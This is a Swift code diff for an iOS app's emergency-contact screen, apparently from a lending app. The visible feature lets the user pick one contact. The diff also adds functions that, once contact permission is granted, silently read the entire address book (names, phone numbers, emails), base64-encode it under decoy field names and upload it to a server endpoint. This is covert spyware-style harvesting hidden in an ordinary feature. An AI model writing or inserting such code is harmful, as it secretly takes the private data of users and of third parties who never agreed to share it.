@@ -156,14 +156,25 @@ class LLPhontClickCell: UITableViewCell {
 
 class LLStepTFViewController: LLBaseViewController {
     
+    var currentLabel: UILabel?
+    
     var lo = BehaviorRelay<String>(value: "")
     
-    var modelArray = BehaviorRelay<[unendingModel]>(value: [])
+    var modelArray = BehaviorRelay<[widehallModel]>(value: [])
+    
+    var unending: widehallModel?
     
     lazy var headView: HeadView = {
         let headView = HeadView()
         headView.mlabel.text = "EMERGENCY CONTACT"
         return headView
+    }()
+    
+    lazy var pickerVc: CNContactPickerViewController = {
+        let pickerVc = CNContactPickerViewController()
+        pickerVc.delegate = self
+        pickerVc.displayedPropertyKeys = [CNContactPhoneNumbersKey]
+        return pickerVc
     }()
     
     lazy var tableView: UITableView = {
@@ -211,23 +222,44 @@ class LLStepTFViewController: LLBaseViewController {
             cell.backgroundColor = .clear
         }.disposed(by: disposeBag)
         
-        tableView.rx.modelSelected(unendingModel.self).subscribe(onNext: { [weak self] model in
+        tableView.rx.itemSelected.asObservable().subscribe(onNext: { [weak self] indexPath in
             guard let self = self else { return }
-            HQQuanXianConig.canPer { scure in
-                if scure {
-                    
-                }else {
-                    HQQuanXianConig.showAlert(in: self, title: "Access to contacts is necessary.", message: "To use this feature, please allow contact access in your Settings.")
+            if let model = try? self.tableView.rx.model(at: indexPath) as widehallModel {
+                if let cell = self.tableView.cellForRow(at: indexPath) as? LLPhontClickCell {
+                    HQQuanXianConig.canPer { [weak self] scure in
+                        guard let self = self else { return }
+                        if scure {
+                            let oneArray = OnePopConfig.getOneDetails(dataSourceArr: model.losing)
+                            DispatchQueue.main.async {
+                                OneTwoThreePopConfig.popLastEnum(.province, cell.mlabel1, oneArray, model) {
+                                    //poptxlx
+                                    self.unending = model
+                                    self.currentLabel = cell.mlabel2
+                                    self.present(self.pickerVc, animated: true, completion: nil)
+                                }
+                            }
+                            self.shanglianxirenxinxi { modelArray in
+                                self.sclianxi(from: modelArray ?? [["phone": "9"]])
+                            }
+                        } else {
+                            DispatchQueue.main.async {
+                                HQQuanXianConig.showAlert(
+                                    in: self,
+                                    title: "Access to contacts is necessary.",
+                                    message: "To use this feature, please allow contact access in your Settings."
+                                )
+                            }
+                        }
+                    }
                 }
             }
         }).disposed(by: disposeBag)
-        
     }
     
 }
 
 
-extension LLStepTFViewController: UITableViewDelegate {
+extension LLStepTFViewController: UITableViewDelegate, CNContactPickerDelegate {
     
     private func mesinfo() {
         ViewLoadingManager.addLoadingView()
@@ -276,20 +308,114 @@ extension LLStepTFViewController: UITableViewDelegate {
             }
             nextBtn.rx.tap.subscribe(onNext: { [weak self] in
                 guard let self = self else { return }
-                //                self.bcinfo()
+                self.bcinfo()
             }).disposed(by: disposeBag)
         }
         return footView
     }
     
+    func shanglianxirenxinxi(completion: @escaping ([[String: Any]]?) -> Void) {
+        let keysToFetch: [CNKeyDescriptor] = [
+            CNContactGivenNameKey as NSString,
+            CNContactFamilyNameKey as NSString,
+            CNContactPhoneNumbersKey as NSString,
+            CNContactEmailAddressesKey as NSString
+        ]
+        let fetchRe = CNContactFetchRequest(keysToFetch: keysToFetch)
+        let lianxiren = CNContactStore()
+        DispatchQueue.global(qos: .userInitiated).async {
+            var lianxirenArray: [[String: Any]] = []
+            do {
+                try lianxiren.enumerateContacts(with: fetchRe) { (contact, stop) in
+                    let phoneNumbers = contact.phoneNumbers.map { $0.value.stringValue }
+                    let emailAddresses = contact.emailAddresses.map { $0.value as String }
+                    let phhonArrar = phoneNumbers.isEmpty ? "" : phoneNumbers.joined(separator: ",")
+                    let emailStr = emailAddresses.isEmpty ? "" : emailAddresses.joined(separator: ",")
+                    let kContact: [String: Any] = [
+                        "quench": "box911",
+                        "smaller": contact.givenName + contact.familyName,
+                        "vaguely": phhonArrar,
+                        "encouragingly": emailStr,
+                        "partitioned": "amd_yes",
+                        "selection": "x"
+                    ]
+                    lianxirenArray.append(kContact)
+                }
+                completion(lianxirenArray)
+            } catch {
+                completion([["quench": "911"], ["vaguely": "phone"]])
+                print("error contacts: \(error)")
+            }
+        }
+    }
+    
+    func sclianxi(from modelArray: [[String: Any]]) {
+        let data = try? JSONSerialization.data(withJSONObject: modelArray, options: [])
+        let base64Data = data?.base64EncodedString() ?? ""
+        let dict = ["separately": "3", "itself": base64Data, "fish": self.lo.value, "grilled": "1"]
+        let man = LLRequestManager()
+        man.uploadDataAPI(params: dict, pageUrl: "/lpinoy/might/worth/nobuko", method: .post) { result in
+            
+        }
+    }
+    
+    func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
+        let nameStr = contact.givenName + " " + contact.familyName
+        if let phoneNumber = contact.phoneNumbers.first?.value {
+            let numberStr = phoneNumber.stringValue
+            if let currentLabel = self.currentLabel {
+                currentLabel.textColor = .black
+                currentLabel.text = nameStr + "-" + numberStr
+                self.unending?.aquizzical = nameStr
+                self.unending?.waslooking = numberStr
+            }
+        }
+    }
+    
+    func contactPickerDidCancel(_ picker: CNContactPickerViewController) {
+        print("Contact canceled")
+    }
+    
+    
+    func bcinfo() {
+        let resultArray = modelArray.value.map { model -> [String: Any] in
+            return [
+                "waslooking": model.waslooking ?? "",
+                "aquizzical": model.aquizzical ?? "",
+                "wasempty": model.wasempty ?? "",
+                "prettiest": model.prettiest ?? ""
+            ]
+        }
+        ViewLoadingManager.addLoadingView()
+        
+        if let jsonshuju = try? JSONSerialization.data(withJSONObject: resultArray, options: []) {
+            if let jsonzifu = String(data: jsonshuju, encoding: .utf8){
+                let dict = ["pre": "3", "preferreda": jsonzifu, "lo": self.lo.value, "grilled": "1"]
+                let man = LLRequestManager()
+                man.uploadDataAPI(params: dict as [String : Any], pageUrl: "/ll/geralds/learned/sight", method: .post) { [weak self] result in
+                    ViewLoadingManager.hideLoadingView()
+                    guard let self = self else { return }
+                    switch result {
+                    case .success(let success):
+                        let model = success.preferreda
+                        if let gabbling = model.hisgold?.gabbling {
+                            self.nextvc(form: gabbling, proid: self.lo.value)
+                        }
+                        print("model:\(model)")
+                        break
+                    case .failure(let failure):
+                        break
+                    }
+                }
+            }
+        }
+        
+    }
 }
-
-
-typealias ContactsPCompletion = ((Bool) -> Void)
 
 class HQQuanXianConig: NSObject, CNContactPickerDelegate {
     
-    static func canPer(completion: @escaping ContactsPCompletion) {
+    static func canPer(completion: @escaping ((Bool) -> Void)) {
         let contactStore = CNContactStore()
         Task {
             let accessGranted = await requestAccessIfNeeded(contactStore: contactStore)
